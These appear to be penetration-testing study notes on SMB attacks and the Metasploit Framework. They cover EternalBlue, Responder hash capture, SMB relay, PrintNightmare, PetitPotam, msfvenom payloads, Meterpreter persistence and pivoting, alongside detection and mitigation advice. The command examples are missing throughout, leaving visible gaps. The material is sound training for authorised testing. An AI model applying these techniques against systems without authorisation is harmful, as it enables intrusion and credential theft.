body: 03.1 — Network Scanning & SMB Attacks Network Pentesting Overview Network pentesting covers attacking services running on hosts — not web applications, but raw TCP/UDP services: file shares, remote administration, databases, email, DNS, and more. The attack chain: You've covered host discovery and port scanning in 01.2 — Active Recon & Nmap. This module focuses on exploiting what you find. Service Enumeration — Banner Grabbing Before attacking a service, identify exactly what it is and what version it's running. What to Do With Version Info 1. Note the exact version string: 2. Search: 3. Search NVD: 4. Search ExploitDB: SMB — Server Message Block SMB is a Windows file and printer sharing protocol. It runs on: Port 445 (direct SMB over TCP — modern) Port 139 (SMB over NetBIOS — legacy) SMB is historically one of the most exploited services in network pentesting. EternalBlue, WannaCry, NotPetya — all SMB based. SMB Enumeration with enum4linux enum4linux is a Linux tool for extracting information from Windows SMB services — users, shares, password policies, groups. SMB Enumeration with Nmap NSE Connecting to SMB Shares with smbclient What to Look For in SMB Shares Config files with credentials ( , , ) Database backup files ( , ) Password files ( , ) Scripts with hardcoded credentials ( , ) Documents containing sensitive business data SMB Vulnerability: EternalBlue (MS17 010) EternalBlue is an NSA developed exploit leaked by Shadow Brokers in 2017. It exploits a buffer overflow in Windows SMBv1, allowing unauthenticated remote code execution. Affected: Windows XP through Windows Server 2008 R2 (unpatched) Used by: WannaCry ransomware, NotPetya, numerous APT groups [!danger] EternalBlue crashes patched systems and can also destabilise unpatched ones. Always have an emergency contact ready. On live engagements, confirm with the client before running this — it can take down production servers. Step 1 — Check if Vulnerable Step 2 — Exploit with Metasploit If successful: Meterpreter shell as SYSTEM (full control). Step 3 — Manual Exploit (without Metasploit) SMBGhost (CVE 2020 0796) A compression related buffer overflow in SMBv3. Affects Windows 10 version 1903/1909 and Server 2019 (unpatched). LLMNR / NBT NS Poisoning with Responder What LLMNR and NBT NS Are When a Windows machine tries to resolve a hostname that DNS can't resolve, it falls back to: LLMNR (Link Local Multicast Name Resolution) — broadcast on the local network NBT NS (NetBIOS Name Service) — older broadcast protocol Any machine on the network can respond to these broadcasts. Responder pretends to be the requested server, captures the authentication attempt, and receives NTLMv2 password hashes. How the Attack Works Responder Cracking Captured Hashes [!warning] Responder should only be run during authorised testing windows. It interferes with legitimate network resolution — users may experience connectivity issues while it's active. Always agree timing with the client. CrackMapExec (CME / NetExec) CrackMapExec is a post exploitation and lateral movement tool for Windows/Active Directory environments. It automates common tasks across many hosts simultaneously. SMB Enumeration Pass the Hash with CME If you have an NTLM hash but not the plaintext password, you can authenticate directly with the hash (no cracking needed): Execute Commands Remotely FTP Attacks FTP transmits in plaintext — capture credentials from traffic if you're in a MITM position (see 03.3 — Traffic Analysis). SSH Attacks SSH is usually well configured, but common misconfigurations exist. SNMP Attacks SNMP (Simple Network Management Protocol) runs on UDP 161. It exposes system information — running processes, network interfaces, installed software, user accounts. Community strings are like passwords. Default community strings: (read), (write). RDP Attacks RDP (Remote Desktop Protocol) runs on TCP 3389. Quick Reference | Service | Default Port | Key Attack | | | | | | SMB | 445, 139 | EternalBlue, Pass the Hash, null session | | FTP | 21 | Anonymous login, plaintext creds | | SSH | 22 | Weak keys, brute force, user enum | | RDP | 3389 | BlueKeep, brute force, pass the hash | | SNMP | 161/UDP | Default community strings, info disclosure | | LLMNR/NBT NS | broadcast | Responder hash capture | Related Notes 01.2 — Active Recon & Nmap 03.2 — Metasploit Framework 03.3 — Password Attacks 03.4 — Traffic Analysis MODULE 4 — Active Directory Pentesting Netcat — TCP/UDP Listeners Netcat ( ) is the Swiss Army knife for raw TCP/UDP connections. You've already seen it used above for banner grabbing ( ). The other core use is catching reverse shells — after you trigger a payload on a target, you need a listener on your machine ready to receive the incoming connection. How it fits into the attack chain: Common reverse shell payloads that connect back to your nc listener: [!tip] Port 4444 is just convention. Use any port that isn't blocked by the target's egress firewall. Port 443 or 80 often bypasses outbound filtering since they look like normal HTTPS/HTTP traffic. SMB Protocol Internals What SMB Actually Is Server Message Block is a request/response application layer protocol for sharing files, printers, named pipes, and IPC over a network. Originally designed by IBM in the 80s, adopted and extended heavily by Microsoft, it is the backbone of every Windows file share, every UNC path, and every domain joined system's authentication over network path. Versions — and Why The Differences Matter | Version | Year | OS Default | Key Properties | Pentest Relevance | | | | | | | | SMBv1 / CIFS | 1996 | XP, 2003, 2008 | No required signing, weak crypto, vast attack surface | Vulnerable to EternalBlue (MS17 010), should be disabled everywhere — / | | SMB 2.0 / 2.1 | 2006 / 2009 | Vista, 7, 2008 | Reduced commands, request batching, optional signing | Still common; supports relay if signing not enforced | | SMB 3.0 | 2012 | Win 8, 2012 | AES CCM encryption, SMB Direct (RDMA), Multichannel | Enable encryption per share with | | SMB 3.1.1 | 2015 | Win 10, 2016+ | Pre auth integrity (SHA 512), AES 128 GCM, AES 256 GCM (Win 11) | Modern baseline; pre auth integrity blocks downgrade attacks | The two really important deltas: SMBv1 is exploitable as a worm vector (EternalBlue) and must die; SMBv3.1.1 mandates pre auth integrity which kills the SMB downgrade attack. How a Windows File Share Session Actually Works A connection to walks through five protocol phases: 1. Negotiate — Client and server agree on the highest mutually supported dialect (SMBv1 ↔ SMB3.1.1). Pre auth integrity hashes are seeded here in 3.1.1. 2. Session Setup — Authentication occurs. With AD: Kerberos (TGS for ); without Kerberos: NTLM challenge response. The session is established in this phase — the NetNTLMv2 hashes Responder captures are this phase's payload. 3. Tree Connect — Client requests access to a specific share ( is a tree). Server returns a . 4. File Operations — , , , , , etc. — all referencing the TreeID and a per file . 5. Disconnect / Logoff — then ends the session. Ports — 139 vs 445 | Port | Stack | Notes | | | | | | 445/TCP | SMB directly over TCP | Modern, no NetBIOS. This is what you target on Windows 2000+ | | 139/TCP | SMB over NetBIOS over TCP/IP (NBT) | Legacy. Adds NetBIOS naming/session services. Still seen on older or oddly configured hosts. | | 137/UDP | NetBIOS Name Service (NBNS / NBT NS) | The "name resolution" piece — the same protocol Responder poisons. | | 138/UDP | NetBIOS Datagram Service | Browser service announcements. | If only 139 is open you're talking through NBT — same SMB protocol on top, just more wrappers. If only 445 is open you're talking pure SMB. Most modern Windows hosts expose both for back compat. NetBIOS Names Pre DNS Windows networking. A NetBIOS name is 15 chars + 1 byte suffix . The suffix encodes the role: | Suffix (hex) | Meaning | | | | | | Workstation service | | | Messenger service | | | File server service | | | Domain master browser (PDC) | | | Domain controllers (group) | | | Master browser | | | Browser service elections | Why it matters: tools like , , and the Windows command pull these out and effectively give you a host inventory without DNS, which is gold during internal recon. It also lets you spot domain controllers ( ) and browse masters at a glance. NTLM Challenge Response over SMB NTLMv2 over SMB looks like this on the wire (this is exactly what Responder captures and dumps in form): 1. NEGOTIATE MESSAGE (Type 1) — client → server: "Here's what NTLM features I support." 2. CHALLENGE MESSAGE (Type 2) — server → client: random 8 byte challenge. 3. AUTHENTICATE MESSAGE (Type 3) — client → server: = HMAC MD5(NTLMv2Hash, challenge || blob) = HMAC MD5(NTHash, uppercase(username) || domain) = MD4(UTF 16 LE(password)) The server forwards this to the DC for verification (or, if local auth, checks against the SAM). That whole chain is what makes hashcat mode (NetNTLMv2) crackable: you have everything except the password, so you can recompute it for every guess. Signing — and Why Relay Cares About It SMB signing means every packet carries an HMAC MD5 / HMAC SHA 256 signature derived from the session key. Signing is one of three modes per side: | Setting | | (default on DC) | | | | | | | | Both sides Required | ✅ Signing enforced | ✅ Signing enforced | ✅ Signing enforced | | Server Required | Signed | Signed | Connection refused | | Server Enabled, Client not Required | Signed if both, else unsigned | Unsigned if client doesn't ask | Unsigned | | Server Disabled | Unsigned | Unsigned | Unsigned | Domain Controllers require signing by default. Member servers and workstations do NOT. That gap is the entire reason SMB Relay attacks still work in 2026 — a captured NTLM response can be relayed to any host where signing is not required. SMB Enumeration — Complete Tooling Reference Nmap NSE — Full SMB Pack Each script in plain English: — list shares and access rights — list users via SAMR (often needs creds) — list groups — list trusted domains — running services (creds needed) — Windows version + hostname — which SMB versions enabled — SMBv1 signing posture — SMBv2/3 signing posture — EternalBlue check — SMBGhost check smbclient — Every Common Mode smbmap — Share Permission Mapper The fastest way to answer "which shares can I read or write?" across a host or subnet. The output column you want is / / per share — that tells you instantly where to look for credentials, configs, and where you can drop tooling. enum4linux / enum4linux ng NetExec (formerly CrackMapExec) is the modern fork; / still works but is unmaintained. Use for new work. rpcclient — MS RPC over SMB lets you talk to Windows RPC interfaces over SMB named pipes. It's how you query SAMR (account manager), LSA (local security authority), and SRVSVC (server service) directly. Anonymous (null session) often works on older systems and misconfigured hosts. Null Sessions — The Anonymous SMB Login A null session is to IPC$. On well configured modern Windows it returns nothing. On older systems (2003 and below), default installed Samba on Linux servers, and some appliances, it gives away users, shares, password policy, and group memberships. If a null session works, run immediately — it'll do RID cycling and dump the user list, which feeds directly into a password spray ( ). SMB Vulnerabilities — The Core Set EternalBlue (MS17 010) — The Full Story NSA developed exploit for a buffer overflow in , the kernel mode SMBv1 driver. Leaked by Shadow Brokers in April 2017. Powers WannaCry (May 2017) and NotPetya (June 2017). Mechanism in plain English: The SMBv1 request has a subcommand called that's never used legitimately. By sending crafted Trans2 packets with overlapping File Extended Attribute (FEA) and OS/2 FEA (OS2FEA) lengths, you can cause to miscalculate the conversion size and overflow a non paged kernel pool buffer. The overflow corrupts adjacent kernel structures including the pool descriptor, eventually letting you control the and overwrite it with the SYSTEM token — instant SYSTEM level RCE on the target. Affected: Windows XP SP3, Server 2003, Vista, 7, 8, Server 2008/R2, Server 2012/R2, Server 2016 (only if SMBv1 still enabled). Patched by MS17 010 in March 2017 (a month before the leak — anyone unpatched after April 2017 stayed vulnerable purely through neglect). Worm propagation (WannaCry / NotPetya): Once an infected host had SYSTEM level access via EternalBlue, the worm code ( ) scanned for other port 445 open hosts on the same subnet and random IPs across the Internet, dropping the same exploit and DoublePulsar implant onto each. Within 24 hours WannaCry hit 230,000+ machines in 150 countries — primarily because organisations had unpatched SMBv1 reachable from the internet or from VPN connected employee laptops. Detection signature: Windows Event ID 4625 (failed network logon, type 3) followed immediately by 4624 (successful logon as SYSTEM with NULL session ID) on the same SMB session. Also: unusual SMBv1 Trans2 packet sizes in network telemetry, anomalous non paged pool usage, and sudden network wide SMB scanning from a single host (worm behaviour). SMB Relay Attacks — Why Disabled Signing Is a Disaster If SMB signing is not required, an attacker who can intercept (Responder, ARP spoof, IPv6 takeover, mitm6) or coerce (PetitPotam, PrintNightmare) NTLM authentication from a victim can relay that authentication to a different server and get authenticated as the victim there. The classic scenario: 1. User on types (typo) → DNS fails → LLMNR broadcast. 2. Attacker's Responder answers, captures the SMB connection. 3. Instead of just capturing the hash for offline crack, forwards the live authentication to (where signing is not required ). 4. asks WS01 to prove the password (challenge). Attacker passes the challenge through. 5. WS01 computes the response → attacker passes it through → accepts. 6. Attacker is now authenticated to as the user who typed the typo. If that user is a local admin on → SYSTEM shell. Detection: Sudden SMB authentication from one host arriving at another host moments after a name resolution failure. EventID 4624 with logon type 3 + IP source mismatch (the user actually sat at but the auth hits from the attacker's IP). LLMNR/NBT NS traffic outbound from non DNS hosts. Hard mitigations: 1. on every server. 2. Disable LLMNR via Group Policy ( ). 3. Disable NBT NS on every NIC ( or registry per adapter ). 4. Enable Extended Protection for Authentication (EPA) on web/SMB endpoints. PrintNightmare (CVE 2021 1675 / CVE 2021 34527) A logic flaw in the Print Spooler service ( ) — specifically in . Any authenticated user can request the spooler to load a printer driver from a remote SMB path; the spooler runs as SYSTEM and dutifully loads (and executes) the DLL. Two CVEs because: CVE 2021 1675 was the original local privilege escalation patch in June 2021. Researchers immediately found the same code path was also reachable remotely via the named pipe → CVE 2021 34527 (the actual "PrintNightmare") was issued July 2021 with an out of band patch. Many environments still have spooler running on DCs (default!), making any authenticated user a potential domain admin. Hard mitigation: Stop and disable Print Spooler on every host that doesn't actively print — especially on DCs. . Group Policy: . PetitPotam — Coercing DC Authentication PetitPotam abuses MS EFSRPC (Encrypting File System Remote Protocol). The (and several sibling) RPC calls take a UNC path; the server attempts to authenticate to that UNC path. Since DCs accept this RPC from authenticated (and on some patches, even un authenticated) callers, you can coerce a DC to authenticate to your listener. Combined with NTLM relay to AD CS web enrollment (ESC8), you get a domain controller computer account certificate → Pass the Cert to DC → domain admin. Hard mitigation: Microsoft KB5005413 (now mandatory updates) plus enabling Extended Protection for Authentication on the AD CS web endpoint and forcing HTTPS only with channel binding. Block NTLM authentication to the CA entirely if possible. SMBGhost (CVE 2020 0796) Buffer overflow in SMBv3.1.1 compression handling ( in ). Affects Windows 10 / Server versions 1903 and 1909 only. Pre auth, kernel RCE — same impact class as EternalBlue but on modern OS versions. Kali Linux Reconnaissance Cheat Sheet A compact reference for the recon phase before the SMB /service attack phase. Pair with 01.1 — Passive Recon & OSINT and 01.2 — Active Recon & Nmap. Nmap Quick Reference DNS Enumeration WHOIS & Passive Service Specific Local Network Recon Putting It Together — Standard External Recon Workflow This is the structure I lean on for any external scope and adapt for internal (skip steps 1–3, jump straight to 4 with the in scope ranges).

title: 03.2 — Metasploit Framework
body: 03.2 — Metasploit Framework What Metasploit Is Metasploit is the world's most widely used penetration testing framework. It provides: A database of exploitation modules for thousands of CVEs Payload generation (shellcode, reverse shells, stagers) Post exploitation capabilities via Meterpreter Auxiliary modules for scanning and enumeration It is not a magic button — understanding what each module does and why is essential. Mindlessly running modules without understanding them is how you crash production servers and fail interviews. Architecture Starting Metasploit Core Commands Payloads Payload Types Singles (non staged): Self contained — everything in one shellcode blob. Larger but more reliable. Named with single : Stagers + Stages (staged): Stager is tiny — it connects back to Metasploit and downloads the full stage. Named with double : When to use which: Staged: buffer overflows with limited space, evasion conscious engagements Non staged: when you control the execution directly (file upload, macro, etc.) Connection Directions Reverse TCP (most common): Target connects back to you. Bypasses inbound firewall rules. Bind TCP : You connect to a listener on the target. Works when you can't receive connections (NAT). Reverse HTTPS : Disguises C2 traffic as HTTPS. Harder to detect/block. Common Payload Names | Payload | Description | | | | | | Meterpreter, 64 bit Windows, staged | | | Meterpreter, 32 bit Windows, staged | | | Meterpreter, 64 bit Linux, staged | | | Basic CMD shell, 64 bit, staged | | | Basic CMD shell, 64 bit, single | | | JSP web shell payload | | | PHP Meterpreter | | | Python Meterpreter | msfvenom — Payload Generator msfvenom generates standalone payloads for delivery outside of Metasploit (email attachments, file uploads, USB drops, etc.). [!warning] Modern AV and EDR will catch most msfvenom generated payloads. Shikata ga nai has been detected for years. For real engagements requiring AV evasion, use Sliver, Havoc, or custom shellcode loaders. msfvenom remains useful for CTFs and internal lab environments. Setting Up a Multi Handler When using msfvenom payloads outside of msfconsole, you need a handler to catch the incoming connection. Then deliver to the target. When executed, Meterpreter connects back to the handler. Meterpreter — Post Exploitation Shell Meterpreter is Metasploit's advanced payload. It runs entirely in memory (no file on disk), communicates over an encrypted channel, and provides powerful post exploitation capabilities. Core Commands Privilege Escalation from Meterpreter Hashdump — Dump Windows Password Hashes Persistence via Meterpreter Auxiliary Modules Auxiliary modules don't use payloads — they scan, enumerate, or perform specific actions. Post Exploitation Modules Run these after you have a Meterpreter session. Pivoting with Metasploit Once you have a foothold on an internal host, use it to reach other network segments. Quick Reference | Module Type | Purpose | Example | | | | | | exploit | Trigger a vulnerability | ms17 010 eternalblue | | auxiliary | Scan / enumerate / brute force | smb login scanner | | post | Run after shell obtained | local exploit suggester | | payload | Code to execute on target | meterpreter/reverse tcp | Related Notes 03.1 — Network Scanning & SMB Attacks 03.3 — Password Attacks 03.4 — Traffic Analysis MODULE 6 — Privilege Escalation MODULE 7 — Post Exploitation & Pivoting
